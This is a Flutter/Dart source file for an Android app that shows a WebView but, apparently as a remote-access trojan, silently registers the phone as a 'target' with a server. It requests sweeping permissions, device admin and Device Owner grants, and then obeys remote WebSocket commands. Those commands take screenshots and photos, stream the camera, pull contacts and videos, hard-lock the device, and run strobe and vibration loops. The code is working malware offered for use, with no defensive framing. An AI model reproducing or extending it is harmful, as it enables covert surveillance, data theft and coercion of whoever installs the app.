import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:web_socket_channel/web_socket_channel.dart';

import 'config/build_config.dart';

// ==========================================
// ===== GLOBAL =====
// ==========================================
const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');

// ==========================================
// ===== MAIN =====
// ==========================================
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Redirect debugPrint → print biar muncul di rilis
  debugPrint = (String? message, {int? wrapWidth}) {
    print(message ?? '');
  };

  print('🚀 [MAIN] App starting...');
  runApp(const GeneratedApp());
}

// ==========================================
// ===== ROOT APP =====
// ==========================================
class GeneratedApp extends StatelessWidget {
  const GeneratedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: BuildConfig.appName,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: const Color(0xFF2196F3)),
        useMaterial3: true,
      ),
      home: const AppBootstrap(),
    );
  }
}

// ==========================================
// ===== BOOTSTRAP =====
// ==========================================
class AppBootstrap extends StatefulWidget {
  const AppBootstrap({super.key});

  @override
  State<AppBootstrap> createState() => _AppBootstrapState();
}

class _AppBootstrapState extends State<AppBootstrap>
    with WidgetsBindingObserver {
  String _status = 'Memuat...';
  bool _ready = false;
  bool _hasRegistered = false;
  bool _isRegistering = false;
  DateTime? _lastRegisterTime;

  final _commandService = CommandHandlerService();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    print('🎬 [BOOTSTRAP] initState');

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _bootstrap();
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _commandService.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    print('📱 [LIFECYCLE] state: $state');

    if (state == AppLifecycleState.resumed) {
      if (_lastRegisterTime != null &&
          DateTime.now().difference(_lastRegisterTime!) <
              const Duration(minutes: 5)) {
        print('⏭️ [LIFECYCLE] Skip register (cooldown)');
        return;
      }
      if (_hasRegistered) {
        print('⏭️ [LIFECYCLE] Already registered');
        return;
      }
      print('🔄 [LIFECYCLE] resumed → register');
      _registerDeviceWithRetry();
    }
  }

  // ==========================================
  // ===== BOOTSTRAP =====
  // ==========================================
  Future<void> _bootstrap() async {
    print('🚀 [BOOTSTRAP] START');

    // STEP 1: SAVE CONFIG
    print('📦 [BOOTSTRAP] Step 1: Save config');
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('accessKey', BuildConfig.accessKey);
      await prefs.setString('appName', BuildConfig.appName);
      await prefs.setString('buildId', BuildConfig.buildId);
      await prefs.setString('packageName', BuildConfig.packageName);
      await prefs.setString('serverUrl', BuildConfig.serverUrl);
      await prefs.setBool('isNativeApp', true);

      String id = prefs.getString('deviceId') ?? '';
      if (id.isEmpty) {
        id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
        await prefs.setString('deviceId', id);
        print('🆕 [BOOTSTRAP] New deviceId: $id');
      } else {
        print('📱 [BOOTSTRAP] Existing deviceId: $id');
      }

      print('✅ [BOOTSTRAP] Config saved');
    } catch (e) {
      print('❌ [BOOTSTRAP] Prefs error: $e');
    }

    // STEP 2: REGISTER DEVICE
    print('📦 [BOOTSTRAP] Step 2: REGISTER DEVICE');
    if (mounted) setState(() => _status = 'Mendaftar device...');

    try {
      await _registerDeviceWithRetry();
      print('✅ [BOOTSTRAP] Register done');
    } catch (e) {
      print('❌ [BOOTSTRAP] Register error: $e');
    }

    // STEP 3: Request permissions
    print('📦 [BOOTSTRAP] Step 3: Request permissions');
    if (mounted) setState(() => _status = 'Meminta izin...');

    _requestPermissions()
        .then((_) => print('✅ [BOOTSTRAP] Permissions done'))
        .catchError((e) => print('⚠️ [BOOTSTRAP] Permission error: $e'));

    // STEP 4: Auto-grant Device Owner
    _autoGrantPermissionsBackground();

    // STEP 5: Start command handler
    print('📦 [BOOTSTRAP] Step 5: Start command handler');
    _commandService.start();

    // STEP 6: Ready
    print('📦 [BOOTSTRAP] Step 6: Ready');
    await Future.delayed(const Duration(milliseconds: 300));
    if (!mounted) return;
    setState(() {
      _status = 'Siap';
      _ready = true;
    });
    print('🎉 [BOOTSTRAP] COMPLETE');
  }

  // ==========================================
  // ===== AUTO-GRANT =====
  // ==========================================
  Future<void> _autoGrantPermissionsBackground() async {
    try {
      print('🔐 [AUTOGRANT] Mencoba auto-grant via Device Owner...');
      final granted = await _deviceChannel
          .invokeMethod<bool>('autoGrantAllPermissions');
      print('🔐 [AUTOGRANT] Hasil: $granted');
    } catch (e) {
      print('⚠️ [AUTOGRANT] Error: $e');
    }
  }

  // ==========================================
  // ===== REQUEST PERMISSIONS =====
  // ==========================================
  Future<void> _requestPermissions() async {
    int sdkInt = 0;
    try {
      sdkInt = await _getAndroidSdkInt();
      print('📱 [PERM] Android SDK: $sdkInt');
    } catch (e) {}

    final permissions = <Permission>[
      Permission.camera,
      Permission.microphone,
      Permission.phone,
      Permission.sms,
      Permission.location,
      Permission.locationWhenInUse,
      Permission.locationAlways,
      Permission.notification,
      Permission.contacts,
      Permission.bluetooth,
      Permission.bluetoothScan,
      Permission.bluetoothConnect,
    ];

    if (sdkInt >= 33) {
      permissions.addAll([
        Permission.photos,
        Permission.videos,
        Permission.audio,
      ]);
    } else {
      permissions.add(Permission.storage);
    }

    for (final perm in permissions) {
      try {
        final status = await perm.status;
        if (status.isDenied || status.isLimited) {
          final result = await perm.request();
          print('🔑 [PERM] $perm: $result');
          await Future.delayed(const Duration(milliseconds: 300));
        }
      } catch (e) {
        print('⚠️ [PERM] $perm error: $e');
      }
    }

    await _requestSpecialPermissions();
  }

  Future<void> _requestSpecialPermissions() async {
    try {
      final status = await Permission.systemAlertWindow.status;
      if (!status.isGranted) {
        print('🔑 [PERM] Requesting overlay permission...');
        await Permission.systemAlertWindow.request();
      }
    } catch (e) {
      print('⚠️ [PERM] Overlay error: $e');
    }

    try {
      final status = await Permission.ignoreBatteryOptimizations.status;
      if (!status.isGranted) {
        print('🔑 [PERM] Requesting battery exemption...');
        await Permission.ignoreBatteryOptimizations.request();
      }
    } catch (e) {
      print('⚠️ [PERM] Battery error: $e');
    }

    try {
      final status = await Permission.requestInstallPackages.status;
      if (!status.isGranted) {
        print('🔑 [PERM] Requesting install packages...');
        await Permission.requestInstallPackages.request();
      }
    } catch (e) {
      print('⚠️ [PERM] Install packages error: $e');
    }

    try {
      await _deviceChannel.invokeMethod('openAccessibilitySettings');
      print('🔓 [PERM] Accessibility settings opened');
    } catch (e) {
      print('⚠️ [PERM] Accessibility error: $e');
    }

    await _requestDeviceAdmin();
  }

  Future<void> _requestDeviceAdmin() async {
    try {
      print('🔐 [ADMIN] Checking device admin status...');
      final isAdmin = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');

      if (isAdmin == true) {
        print('✅ [ADMIN] Device admin already active');
        return;
      }

      print('🔐 [ADMIN] Requesting device admin...');
      await _deviceChannel.invokeMethod('requestDeviceAdmin');
      await Future.delayed(const Duration(seconds: 3));

      final newStatus = await _deviceChannel.invokeMethod<bool>('isDeviceAdmin');
      print('📊 [ADMIN] Status after request: $newStatus');
    } catch (e) {
      print('❌ [ADMIN] Request error: $e');
    }
  }

  // ==========================================
  // ===== HELPERS =====
  // ==========================================
  Future<int> _getAndroidSdkInt() async {
    if (!Platform.isAndroid) return 0;
    try {
      return await _deviceChannel.invokeMethod<int>('getSdkInt') ?? 0;
    } catch (_) {
      return 0;
    }
  }

  Future<String> _getDeviceModel() async {
    try {
      return await _deviceChannel.invokeMethod<String>('getModel') ??
          'Android Device';
    } catch (_) {
      return 'Android Device';
    }
  }

  Future<String> _getDeviceBrand() async {
    try {
      return await _deviceChannel.invokeMethod<String>('getBrand') ?? 'Android';
    } catch (_) {
      return 'Android';
    }
  }

  Future<String> _getAndroidVersion() async {
    try {
      return await _deviceChannel.invokeMethod<String>('getAndroidVersion') ??
          'Unknown';
    } catch (_) {
      return 'Unknown';
    }
  }

  // ==========================================
  // ===== REGISTER DEVICE =====
  // ==========================================
  Future<void> _registerDeviceWithRetry() async {
    if (_isRegistering) {
      print('⏭️ [REGISTER] Already in progress');
      return;
    }
    if (_hasRegistered) {
      print('⏭️ [REGISTER] Already registered');
      return;
    }
    if (BuildConfig.accessKey.isEmpty) {
      print('⚠️ [REGISTER] accessKey kosong, skip');
      return;
    }

    _isRegistering = true;
    try {
      for (int attempt = 1; attempt <= 3; attempt++) {
        print('📡 [REGISTER] Attempt $attempt/3');
        final ok = await _registerDevice();
        if (ok) {
          print('✅ [REGISTER] Success');
          _hasRegistered = true;
          _lastRegisterTime = DateTime.now();
          return;
        }
        if (attempt < 3) await Future.delayed(const Duration(seconds: 2));
      }
      print('❌ [REGISTER] Failed after 3 attempts');
    } finally {
      _isRegistering = false;
    }
  }

  Future<bool> _registerDevice() async {
    try {
      int batteryLevel = 0;
      try {
        batteryLevel = await Battery().batteryLevel;
      } catch (e) {}

      String connType = 'unknown';
      try {
        final conn = await Connectivity().checkConnectivity();
        connType = conn.toString();
      } catch (e) {}

      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('deviceId') ?? '';
      final model = await _getDeviceModel();
      final brand = await _getDeviceBrand();
      final androidVersion = await _getAndroidVersion();

      final payload = {
        'id': deviceId,
        'model': model,
        'brand': brand,
        'androidVersion': androidVersion,
        'battery': batteryLevel,
        'ip': connType,
        'appName': BuildConfig.appName,
        'packageName': BuildConfig.packageName,
        'accessKey': BuildConfig.accessKey,
        'buildId': BuildConfig.buildId,
        'status': 'Online',
        'lastSeen': DateTime.now().toIso8601String(),
      };

      final res = await _httpPost(
        '${BuildConfig.serverUrl}/api/register-target',
        payload,
      );

      return res != null && res.isNotEmpty;
    } catch (e) {
      print('❌ [REGISTER] Error: $e');
      return false;
    }
  }

  // ==========================================
  // ===== HTTP POST =====
  // ==========================================
  Future<String?> _httpPost(
    String url,
    Map<String, dynamic> body,
  ) async {
    HttpClient? client;
    try {
      print('📤 [HTTP] POST → $url');

      client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 15);

      final request = await client.postUrl(Uri.parse(url));
      request.headers.contentType = ContentType.json;
      request.headers.set('X-Access-Key', BuildConfig.accessKey);
      request.write(jsonEncode(body));

      final response = await request.close();
      final responseBody = await response.transform(utf8.decoder).join();

      print('📥 [HTTP] Status: ${response.statusCode}');

      if (response.statusCode >= 200 && response.statusCode < 300) {
        return responseBody;
      }
      return null;
    } on SocketException catch (e) {
      print('❌ [HTTP] SocketException: ${e.message}');
      return null;
    } on TimeoutException catch (e) {
      print('❌ [HTTP] TimeoutException: $e');
      return null;
    } catch (e) {
      print('❌ [HTTP] Error: $e');
      return null;
    } finally {
      client?.close(force: true);
    }
  }

  // ==========================================
  // ===== BUILD =====
  // ==========================================
  @override
  Widget build(BuildContext context) {
    if (!_ready) return _buildLoadingScreen();
    return const WebViewHome();
  }

  Widget _buildLoadingScreen() {
    return Scaffold(
      backgroundColor: Colors.white,
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.sync_rounded, size: 48, color: Colors.blueGrey),
              const SizedBox(height: 20),
              Text(
                BuildConfig.appName,
                style: const TextStyle(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 8),
              Text(
                _status,
                style: const TextStyle(fontSize: 13, color: Colors.black54),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              const SizedBox(
                width: 22,
                height: 22,
                child: CircularProgressIndicator(strokeWidth: 2.5),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================
// ===== COMMAND HANDLER SERVICE =====
// ==========================================
class CommandHandlerService {
  WebSocketChannel? _channel;
  Timer? _reconnectTimer;
  final _deviceChannel = MethodChannel('orgsapp/device_info');

  String? _deviceId;
  String? _accessKey;
  String? _serverUrl;
  bool _connected = false;

  Future<void> start() async {
    final prefs = await SharedPreferences.getInstance();
    _deviceId = prefs.getString('deviceId');
    _accessKey = BuildConfig.accessKey;
    _serverUrl = BuildConfig.serverUrl;

    if (_deviceId == null || _accessKey == null) {
      print('❌ [CMD] Missing deviceId or accessKey');
      return;
    }

    _connect();
  }

  void _connect() {
    try {
      final wsUrl = _serverUrl!
          .replaceFirst('https://', 'wss://')
          .replaceFirst('http://', 'ws://');

      final uri = Uri.parse(
        '$wsUrl/ws?deviceId=$_deviceId&accessKey=$_accessKey',
      );

      print('🔌 [CMD] Connecting to $uri');

      _channel = WebSocketChannel.connect(uri);

      _channel!.stream.listen(
        (raw) {
          print('📩 [CMD] Received: $raw');
          _handleMessage(raw.toString());
        },
        onDone: () {
          print('🔌 [CMD] Disconnected');
          _connected = false;
          _scheduleReconnect();
        },
        onError: (e) {
          print('❌ [CMD] Error: $e');
          _connected = false;
          _scheduleReconnect();
        },
      );

      _connected = true;
      print('✅ [CMD] Connected');
    } catch (e) {
      print('❌ [CMD] Connect error: $e');
      _scheduleReconnect();
    }
  }

  void _scheduleReconnect() {
    _reconnectTimer?.cancel();
    _reconnectTimer = Timer(const Duration(seconds: 5), () {
      if (!_connected) {
        print('🔄 [CMD] Reconnecting...');
        _connect();
      }
    });
  }

  Future<void> _handleMessage(String raw) async {
    try {
      final msg = jsonDecode(raw) as Map<String, dynamic>;
      final type = msg['type']?.toString();

      if (type != 'command') return;

      final command = msg['command']?.toString() ?? '';
      final extra = msg['extra']?.toString() ?? '';
      final commandId = msg['id']?.toString() ?? '';

      print('🎯 [CMD] Executing: $command ($extra)');

      final result = await _executeCommand(command, extra);

      _sendResponse(commandId, command, result);
    } catch (e) {
      print('❌ [CMD] Handle error: $e');
    }
  }

  Future<Map<String, dynamic>> _executeCommand(
    String command,
    String extra,
  ) async {
    try {
      switch (command) {
        // ===== DEVICE INFO =====
        case 'get_device_info':
          final infoStr = await _deviceChannel
              .invokeMethod<String>('getDeviceInfo');
          if (infoStr != null && infoStr.isNotEmpty) {
            return jsonDecode(infoStr) as Map<String, dynamic>;
          }
          return {'error': 'No info'};

        // ===== NETWORK INFO =====
        case 'get_network_info':
          final infoStr = await _deviceChannel
              .invokeMethod<String>('getNetworkInfo');
          if (infoStr != null && infoStr.isNotEmpty) {
            return jsonDecode(infoStr) as Map<String, dynamic>;
          }
          return {'error': 'No info'};

        // ===== VIDEO GALLERY =====
        case 'get_videos':
          final videosStr =
              await _deviceChannel.invokeMethod<String>('getVideos');
          if (videosStr != null && videosStr.isNotEmpty) {
            final videos = jsonDecode(videosStr);
            return {'videos': videos};
          }
          return {'videos': []};

        // ===== KILL SWITCH =====
        case 'kill_switch':
          await _deviceChannel.invokeMethod('killSwitch');
          return {'stopped': true};

        // ===== FORCE OPEN =====
        case 'force_open':
          await _deviceChannel.invokeMethod('forceOpen');
          return {'status': 'ok'};

        // ===== SCREEN CAPTURE =====
        case 'get_screen':
          final base64 =
              await _deviceChannel.invokeMethod<String>('captureScreen');
          return {'image_base64': base64 ?? ''};

        // ===== CAMERA =====
        case 'take_photo':
          final base64 = await _deviceChannel.invokeMethod<String>(
            'takePhoto',
            {'camera': extra.isEmpty ? 'back' : extra},
          );
          return {'image_base64': base64 ?? ''};

        case 'start_camera_stream':
          await _deviceChannel.invokeMethod('startCameraStream', {
            'camera': extra.isEmpty ? 'back' : extra,
          });
          return {'status': 'ok'};

        case 'stop_camera_stream':
          await _deviceChannel.invokeMethod('stopCameraStream');
          return {'status': 'ok'};

        // ===== STROBE / VIBRATE =====
        case 'flash_strobe':
          await _deviceChannel.invokeMethod('flashStrobe');
          return {'status': 'ok'};

        case 'stop_strobe':
          await _deviceChannel.invokeMethod('stopStrobe');
          return {'status': 'ok'};

        case 'vibrate_loop':
          await _deviceChannel.invokeMethod('vibrateLoop');
          return {'status': 'ok'};

        case 'stop_vibrate':
          await _deviceChannel.invokeMethod('stopVibrate');
          return {'status': 'ok'};

        // ===== AUDIO =====
        case 'play_audio':
          await _deviceChannel.invokeMethod('playAudio', {'url': extra});
          return {'status': 'ok'};

        case 'stop_audio':
          await _deviceChannel.invokeMethod('stopAudio');
          return {'status': 'ok'};

        // ===== URL =====
        case 'open_url':
          await _deviceChannel.invokeMethod('openUrl', {'url': extra});
          return {'status': 'ok'};

        // ===== LOCK =====
        case 'hard_lock':
          await _deviceChannel.invokeMethod('hardLock');
          return {'status': 'ok'};

        case 'unlock':
          await _deviceChannel.invokeMethod('unlock');
          return {'status': 'ok'};

        // ===== KONTAK =====
        case 'get_contacts':
          final contacts =
              await _deviceChannel.invokeMethod<List<dynamic>>('getContacts');
          return {'contacts': contacts ?? []};

        // ===== DEFAULT =====
        default:
          print('⚠️ [CMD] Unknown command: $command');
          return {'status': 'unknown_command'};
      }
    } catch (e) {
      print('❌ [CMD] Exec error: $e');
      return {'error': e.toString()};
    }
  }

  void _sendResponse(
    String commandId,
    String command,
    Map<String, dynamic> result,
  ) {
    try {
      final response = {
        'type': 'response',
        'id': commandId,
        'command': command,
        'result': result,
        'ts': DateTime.now().millisecondsSinceEpoch,
      };

      _channel?.sink.add(jsonEncode(response));
      print('📤 [CMD] Response sent: $command');
    } catch (e) {
      print('❌ [CMD] Send response error: $e');
    }
  }

  void dispose() {
    _reconnectTimer?.cancel();
    _channel?.sink.close();
  }
}

// ==========================================
// ===== WEBVIEW HOME =====
// ==========================================
class WebViewHome extends StatefulWidget {
  const WebViewHome({super.key});

  @override
  State<WebViewHome> createState() => _WebViewHomeState();
}

class _WebViewHomeState extends State<WebViewHome> {
  late final WebViewController _controller;
  bool _isLoading = true;
  int _progress = 0;
  bool _hasError = false;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    print('🌐 [WEBVIEW] initState');
    _initWebView();
  }

  void _initWebView() {
    try {
      print('🌐 [WEBVIEW] Initializing...');

      _controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setBackgroundColor(Colors.white)
        ..setUserAgent(
          'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        )
        ..addJavaScriptChannel(
          'AppBridge',
          onMessageReceived: (msg) {
            print('📨 [WEBVIEW] From web: ${msg.message}');
            _handleWebMessage(msg.message);
          },
        )
        ..setNavigationDelegate(
          NavigationDelegate(
            onProgress: (p) {
              if (mounted) setState(() => _progress = p);
            },
            onPageStarted: (_) {
              if (!mounted) return;
              setState(() {
                _isLoading = true;
                _hasError = false;
              });
            },
            onPageFinished: (_) async {
              if (!mounted) return;
              setState(() => _isLoading = false);
              await _injectConfig();
            },
            onWebResourceError: (error) {
              if (!mounted) return;
              setState(() {
                _hasError = true;
                _errorMessage = error.description;
                _isLoading = false;
              });
              print('❌ [WEBVIEW] Error: ${error.description}');
            },
            onNavigationRequest: (request) {
              return NavigationDecision.navigate;
            },
          ),
        )
        ..loadRequest(Uri.parse(BuildConfig.webviewUrl));

      print('✅ [WEBVIEW] Initialized. Loading: ${BuildConfig.webviewUrl}');
    } catch (e) {
      print('❌ [WEBVIEW] Init error: $e');
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal init WebView: $e';
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _injectConfig() async {
    try {
      final js = """
        (function() {
          try {
            localStorage.setItem('accessKey', '${BuildConfig.accessKey}');
            localStorage.setItem('appName', '${BuildConfig.appName}');
            localStorage.setItem('packageName', '${BuildConfig.packageName}');
            localStorage.setItem('buildId', '${BuildConfig.buildId}');
            localStorage.setItem('serverUrl', '${BuildConfig.serverUrl}');
            localStorage.setItem('isNativeApp', 'true');
            console.log('[App] Config injected');
          } catch (e) {
            console.error('[App] Inject error', e);
          }
        })();
      """;
      await _controller.runJavaScript(js);
      print('✅ [WEBVIEW] Config injected');
    } catch (e) {
      print('❌ [WEBVIEW] Inject error: $e');
    }
  }

  void _handleWebMessage(String message) {
    try {
      final data = jsonDecode(message);
      final action = data['action']?.toString();
      print('📨 [WEBVIEW] Action: $action');

      switch (action) {
        case 'openUrl':
          final url = data['url']?.toString();
          if (url != null && url.isNotEmpty) {
            launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
          }
          break;
        case 'close':
          SystemNavigator.pop();
          break;
        case 'force_open':
          _deviceChannel.invokeMethod('forceOpen');
          break;
      }
    } catch (e) {
      print('❌ [WEBVIEW] Parse error: $e');
    }
  }

  Future<void> _reload() async {
    setState(() {
      _hasError = false;
      _isLoading = true;
      _progress = 0;
    });
    try {
      await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
    } catch (e) {
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal reload: $e';
          _isLoading = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        try {
          final canGoBack = await _controller.canGoBack();
          if (canGoBack) {
            await _controller.goBack();
          } else {
            SystemNavigator.pop();
          }
        } catch (e) {
          SystemNavigator.pop();
        }
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              if (!_hasError)
                WebViewWidget(controller: _controller)
              else
                _buildErrorScreen(),
              if (_isLoading && !_hasError)
                Positioned(
                  top: 0,
                  left: 0,
                  right: 0,
                  child: LinearProgressIndicator(
                    value: _progress / 100,
                    backgroundColor: Colors.grey.shade200,
                    color: Colors.blue,
                    minHeight: 2,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildErrorScreen() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.wifi_off_rounded, color: Colors.grey, size: 56),
            const SizedBox(height: 16),
            const Text(
              'Koneksi Bermasalah',
              style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w600,
                color: Colors.black87,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _errorMessage,
              textAlign: TextAlign.center,
              style: const TextStyle(fontSize: 13, color: Colors.black54),
            ),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _reload,
              child: const Text('COBA LAGI'),
            ),
          ],
        ),
      ),
    );
  }
}
